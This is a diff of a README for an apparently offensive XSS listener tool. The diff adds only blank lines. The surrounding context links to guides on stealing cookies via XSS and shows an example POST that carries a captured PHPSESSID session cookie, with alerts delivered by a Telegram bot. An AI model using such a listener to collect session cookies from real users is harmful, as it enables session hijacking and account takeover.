@@ -11,6 +11,7 @@ From now on, you do not need XSS listeners! XSS listener records the data you ha
 * [What is XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
 
 * [Steal cookie with XSS without redirecting to another page](https://security.stackexchange.com/questions/49185/xss-cookie-stealing-without-redirecting-to-another-page)
+
 * [TR | How to use XSS](https://canyoupwn.me/tr-how-to-use-xss/)
 
 
@@ -27,6 +28,7 @@ POST https://yourapp.com/
 Form: { cookie:'PHPSESSID=889c6594db2541db1666cefca7537373' }
 ```
 You will notify by telegram bot.
+
 ![output](https://cagatay.js.org/output.png)
 ---
 
